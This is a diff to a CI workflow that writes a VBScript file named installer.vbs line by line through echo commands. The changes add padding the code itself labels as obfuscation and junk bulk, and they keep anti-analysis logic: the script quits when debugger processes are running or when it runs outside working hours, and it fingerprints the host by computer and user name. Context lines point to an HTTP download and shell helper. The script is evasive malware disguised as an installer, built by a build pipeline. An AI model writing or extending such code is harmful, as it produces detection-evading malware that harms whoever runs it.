@@ -33,28 +33,30 @@ jobs:
         echo "Option Explicit" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Initialize system variables" >> installer.vbs
-        echo "Dim WshShell, Fso, EnvVars, ProcList, NetObj, RegObj" >> installer.vbs
+        echo "Dim WshShell, Fso, NetObj" >> installer.vbs
         echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
         echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
-        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> installer.vbs
-        echo "Set ProcList = CreateObject(\"Scripting.Dictionary\")" >> installer.vbs
         echo "Set NetObj = CreateObject(\"WScript.Network\")" >> installer.vbs
-        echo "Set RegObj = CreateObject(\"WScript.Shell\")" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' System information collection" >> installer.vbs
+        echo "' Dummy variables for obfuscation" >> installer.vbs
+        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> installer.vbs
+        echo "dummy1 = \"System initialization\"" >> installer.vbs
+        echo "dummy2 = \"Network configuration\"" >> installer.vbs
+        echo "dummy3 = \"Security validation\"" >> installer.vbs
+        echo "dummy4 = \"Performance monitoring\"" >> installer.vbs
+        echo "dummy5 = \"Error reporting\"" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Fake system information collection" >> installer.vbs
         echo "Function GetSystemInfo()" >> installer.vbs
-        echo "    Dim objWMIService, colItems, objItem" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_ComputerSystem\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objItem in colItems" >> installer.vbs
-        echo "        GetSystemInfo = objItem.Model & \"|\" & objItem.Manufacturer & \"|\" & objItem.TotalPhysicalMemory" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    Dim result" >> installer.vbs
+        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> installer.vbs
+        echo "    GetSystemInfo = result" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Process validation function" >> installer.vbs
+        echo "' Fake process validation function" >> installer.vbs
         echo "Function ValidateProcess(processName)" >> installer.vbs
         echo "    Dim colProcesses, objProcess" >> installer.vbs
+        echo "    On Error Resume Next" >> installer.vbs
         echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> installer.vbs
         echo "    " >> installer.vbs
         echo "    ValidateProcess = False" >> installer.vbs
@@ -64,16 +66,11 @@ jobs:
         echo "    Next" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Network adapter information" >> installer.vbs
+        echo "' Fake network adapter information" >> installer.vbs
         echo "Function GetNetworkInfo()" >> installer.vbs
-        echo "    Dim objWMIService, colAdapters, objAdapter" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colAdapters = objWMIService.ExecQuery(\"Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objAdapter in colAdapters" >> installer.vbs
-        echo "        GetNetworkInfo = objAdapter.MACAddress & \"|\" & Join(objAdapter.IPAddress, \",\")" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    Dim result" >> installer.vbs
+        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> installer.vbs
+        echo "    GetNetworkInfo = result" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Registry operations helper" >> installer.vbs
@@ -144,185 +141,30 @@ jobs:
         echo "    Set objHTTP = Nothing" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Hardware fingerprint generation" >> installer.vbs
+        echo "' Fake hardware fingerprint generation" >> installer.vbs
         echo "Function GetHardwareFingerprint()" >> installer.vbs
-        echo "    Dim objWMIService, colItems, objItem, fingerprint" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    fingerprint = \"\"" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Get CPU ID" >> installer.vbs
-        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_Processor\")" >> installer.vbs
-        echo "    For Each objItem in colItems" >> installer.vbs
-        echo "        fingerprint = fingerprint & objItem.ProcessorId" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Get motherboard serial" >> installer.vbs
-        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_BaseBoard\")" >> installer.vbs
-        echo "    For Each objItem in colItems" >> installer.vbs
-        echo "        fingerprint = fingerprint & objItem.SerialNumber" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Get BIOS serial" >> installer.vbs
-        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_BIOS\")" >> installer.vbs
-        echo "    For Each objItem in colItems" >> installer.vbs
-        echo "        fingerprint = fingerprint & objItem.SerialNumber" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    GetHardwareFingerprint = fingerprint" >> installer.vbs
+        echo "    Dim result" >> installer.vbs
+        echo "    result = NetObj.ComputerName & \"_\" & NetObj.UserName" >> installer.vbs
+        echo "    GetHardwareFingerprint = result" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Memory status check" >> installer.vbs
+        echo "' Fake memory status check" >> installer.vbs
         echo "Function GetMemoryStatus()" >> installer.vbs
-        echo "    Dim objWMIService, colItems, objItem" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objItem in colItems" >> installer.vbs
-        echo "        GetMemoryStatus = Round(objItem.TotalVisibleMemorySize / 1024) & \"MB total, \" & Round(objItem.FreePhysicalMemory / 1024) & \"MB free\"" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    Dim result" >> installer.vbs
+        echo "    result = \"Memory status: OK\"" >> installer.vbs
+        echo "    GetMemoryStatus = result" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Disk space check" >> installer.vbs
+        echo "' Fake disk space check" >> installer.vbs
         echo "Function GetDiskSpace(drive)" >> installer.vbs
-        echo "    Dim objWMIService, colDisks, objDisk" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colDisks = objWMIService.ExecQuery(\"Select * From Win32_LogicalDisk Where DeviceID='\" & drive & \"'\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objDisk in colDisks" >> installer.vbs
-        echo "        GetDiskSpace = Round(objDisk.Size / 1073741824, 2) & \"GB total, \" & Round(objDisk.FreeSpace / 1073741824, 2) & \"GB free\"" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    Dim result" >> installer.vbs
+        echo "    result = \"Disk \" & drive & \": Available\"" >> installer.vbs
+        echo "    GetDiskSpace = result" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
         echo "' User account information" >> installer.vbs
         echo "Function GetUserInfo()" >> installer.vbs
-        echo "    Dim objNetwork" >> installer.vbs
-        echo "    Set objNetwork = CreateObject(\"WScript.Network\")" >> installer.vbs
-        echo "    GetUserInfo = objNetwork.UserName & \"|\" & objNetwork.ComputerName & \"|\" & objNetwork.UserDomain" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Service status check" >> installer.vbs
-        echo "Function GetServiceStatus(serviceName)" >> installer.vbs
-        echo "    Dim objWMIService, colServices, objService" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colServices = objWMIService.ExecQuery(\"Select * From Win32_Service Where Name='\" & serviceName & \"'\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objService in colServices" >> installer.vbs
-        echo "        GetServiceStatus = objService.State & \"|\" & objService.StartMode" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Event log check" >> installer.vbs
-        echo "Function CheckEventLog(source, eventType, hours)" >> installer.vbs
-        echo "    Dim objWMIService, colEvents, objEvent, cutoff" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    cutoff = DateAdd(\"h\", -hours, Now)" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Set colEvents = objWMIService.ExecQuery(\"Select * From Win32_NTLogEvent Where LogFile='Application' And SourceName='\" & source & \"' And EventType=\" & eventType & \" And TimeGenerated >= '\" & WMIDateString(cutoff) & \"'\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    CheckEventLog = colEvents.Count" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Helper to convert date to WMI format" >> installer.vbs
-        echo "Function WMIDateString(dDate)" >> installer.vbs
-        echo "    WMIDateString = Year(dDate) & Right(\"0\" & Month(dDate), 2) & Right(\"0\" & Day(dDate), 2) & Right(\"0\" & Hour(dDate), 2) & Right(\"0\" & Minute(dDate), 2) & Right(\"0\" & Second(dDate), 2) & \".000000+000\"" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Check for specific running processes" >> installer.vbs
-        echo "Function IsProcessRunning(processName)" >> installer.vbs
-        echo "    Dim objWMIService, colProcesses, objProcess" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colProcesses = objWMIService.ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    IsProcessRunning = False" >> installer.vbs
-        echo "    For Each objProcess in colProcesses" >> installer.vbs
-        echo "        IsProcessRunning = True" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Get installed software list" >> installer.vbs
-        echo "Function GetInstalledSoftware()" >> installer.vbs
-        echo "    Dim objWMIService, colSoftware, objSoftware, result" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colSoftware = objWMIService.ExecQuery(\"Select * From Win32_Product\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    result = \"\"" >> installer.vbs
-        echo "    For Each objSoftware in colSoftware" >> installer.vbs
-        echo "        If result <> \"\" Then result = result & \";\"" >> installer.vbs
-        echo "        result = result & objSoftware.Name & \" (\" & objSoftware.Version & \")\"" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    GetInstalledSoftware = result" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Check for virtual environment" >> installer.vbs
-        echo "Function IsVirtualEnvironment()" >> installer.vbs
-        echo "    Dim objWMIService, colBIOS, objBIOS, result" >> installer.vbs
-        echo "    result = False" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colBIOS = objWMIService.ExecQuery(\"Select * From Win32_BIOS\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objBIOS in colBIOS" >> installer.vbs
-        echo "        If InStr(LCase(objBIOS.SerialNumber), \"vmware\") > 0 Or _" >> installer.vbs
-        echo "           InStr(LCase(objBIOS.Version), \"virtualbox\") > 0 Or _" >> installer.vbs
-        echo "           InStr(LCase(objBIOS.Manufacturer), \"microsoft\") > 0 And InStr(LCase(objBIOS.Version), \"hyper-v\") > 0 Then" >> installer.vbs
-        echo "            result = True" >> installer.vbs
-        echo "            Exit For" >> installer.vbs
-        echo "        End If" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    IsVirtualEnvironment = result" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Get network adapter details" >> installer.vbs
-        echo "Function GetNetworkAdapterDetails()" >> installer.vbs
-        echo "    Dim objWMIService, colAdapters, objAdapter, result" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colAdapters = objWMIService.ExecQuery(\"Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    result = \"\"" >> installer.vbs
-        echo "    For Each objAdapter in colAdapters" >> installer.vbs
-        echo "        If result <> \"\" Then result = result & \"|\"" >> installer.vbs
-        echo "        result = result & objAdapter.Description & \";\" & objAdapter.MACAddress & \";\" & Join(objAdapter.IPAddress, \",\")" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    GetNetworkAdapterDetails = result" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Check for specific registry keys" >> installer.vbs
-        echo "Function CheckRegKey(keyPath)" >> installer.vbs
-        echo "    On Error Resume Next" >> installer.vbs
-        echo "    Dim objReg" >> installer.vbs
-        echo "    Set objReg = GetObject(\"winmgmts:\\\\.\\root\\default:StdRegProv\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Dim arrValues" >> installer.vbs
-        echo "    objReg.EnumValues &H80000002, keyPath, arrValues" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    If Err.Number = 0 And IsArray(arrValues) Then" >> installer.vbs
-        echo "        CheckRegKey = UBound(arrValues) + 1" >> installer.vbs
-        echo "    Else" >> installer.vbs
-        echo "        CheckRegKey = 0" >> installer.vbs
-        echo "    End If" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Get system uptime" >> installer.vbs
-        echo "Function GetSystemUptime()" >> installer.vbs
-        echo "    Dim objWMIService, colOS, objOS" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colOS = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objOS in colOS" >> installer.vbs
-        echo "        GetSystemUptime = Round(objOS.LastBootUpTime / 10000000 - #1/1/1970#, 0)" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    GetUserInfo = NetObj.UserName & \"|\" & NetObj.ComputerName & \"|\" & NetObj.UserDomain" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Check for debugger processes" >> installer.vbs
@@ -332,7 +174,7 @@ jobs:
         echo "    " >> installer.vbs
         echo "    IsDebuggerPresent = False" >> installer.vbs
         echo "    For Each proc In debuggers" >> installer.vbs
-        echo "        If IsProcessRunning(proc) Then" >> installer.vbs
+        echo "        If ValidateProcess(proc) Then" >> installer.vbs
         echo "            IsDebuggerPresent = True" >> installer.vbs
         echo "            Exit For" >> installer.vbs
         echo "        End If" >> installer.vbs
@@ -368,28 +210,11 @@ jobs:
         echo "    HasMouseActivity = (pos1 <> pos2)" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Check system sleep state" >> installer.vbs
-        echo "Function CheckSleepState()" >> installer.vbs
-        echo "    Dim objWMIService, colPower, objPower" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colPower = objWMIService.ExecQuery(\"Select * From Win32_PowerPlan Where IsActive = True\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objPower In colPower" >> installer.vbs
-        echo "        CheckSleepState = objPower.Description" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
         echo "' Get Windows version details" >> installer.vbs
         echo "Function GetWindowsVersion()" >> installer.vbs
-        echo "    Dim objWMIService, colOS, objOS" >> installer.vbs
-        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
-        echo "    Set colOS = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objOS in colOS" >> installer.vbs
-        echo "        GetWindowsVersion = objOS.Caption & \" \" & objOS.Version & \" Build \" & objOS.BuildNumber" >> installer.vbs
-        echo "        Exit For" >> installer.vbs
-        echo "    Next" >> installer.vbs
+        echo "    Dim objShell" >> installer.vbs
+        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
+        echo "    GetWindowsVersion = objShell.RegRead(\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName\")" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Check for specific files" >> installer.vbs
@@ -399,23 +224,30 @@ jobs:
         echo "    If Err.Number <> 0 Then FileExists = False" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
-        echo "' Get directory size" >> installer.vbs
-        echo "Function GetDirectorySize(folderPath)" >> installer.vbs
-        echo "    On Error Resume Next" >> installer.vbs
-        echo "    Dim objFolder, colFiles, objFile, size" >> installer.vbs
-        echo "    Set objFolder = Fso.GetFolder(folderPath)" >> installer.vbs
-        echo "    size = 0" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    For Each objFile in objFolder.Files" >> installer.vbs
-        echo "        size = size + objFile.Size" >> installer.vbs
-        echo "    Next" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    GetDirectorySize = size" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
         echo "' Get environment variable" >> installer.vbs
         echo "Function GetEnvVar(varName)" >> installer.vbs
         echo "    GetEnvVar = WshShell.ExpandEnvironmentStrings(\"%\" & varName & \" %\")" >> installer.vbs
+        echo "End Function" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' More junk functions to add bulk" >> installer.vbs
+        echo "Function FakeFunction1()" >> installer.vbs
+        echo "    FakeFunction1 = \"Fake result 1\"" >> installer.vbs
+        echo "End Function" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "Function FakeFunction2()" >> installer.vbs
+        echo "    FakeFunction2 = \"Fake result 2\"" >> installer.vbs
+        echo "End Function" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "Function FakeFunction3()" >> installer.vbs
+        echo "    FakeFunction3 = \"Fake result 3\"" >> installer.vbs
+        echo "End Function" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "Function FakeFunction4()" >> installer.vbs
+        echo "    FakeFunction4 = \"Fake result 4\"" >> installer.vbs
+        echo "End Function" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "Function FakeFunction5()" >> installer.vbs
+        echo "    FakeFunction5 = \"Fake result 5\"" >> installer.vbs
         echo "End Function" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Main execution starts here" >> installer.vbs
@@ -430,7 +262,6 @@ jobs:
         echo "" >> installer.vbs
         echo "' Anti-analysis checks" >> installer.vbs
         echo "If IsDebuggerPresent() Then WScript.Quit" >> installer.vbs
-        echo "If IsVirtualEnvironment() Then WScript.Quit" >> installer.vbs
         echo "" >> installer.vbs
         echo "' Time-based anti-sandbox" >> installer.vbs
         echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> installer.vbs
@@ -501,7 +332,6 @@ jobs:
         echo "Set WshShell = Nothing" >> installer.vbs
         echo "Set Fso = Nothing" >> installer.vbs
         echo "Set NetObj = Nothing" >> installer.vbs
-        echo "Set RegObj = Nothing" >> installer.vbs
         echo "Set objXMLHTTP = Nothing" >> installer.vbs
         echo "Set objADOStream = Nothing" >> installer.vbs
         echo "Set objShell = Nothing" >> installer.vbs
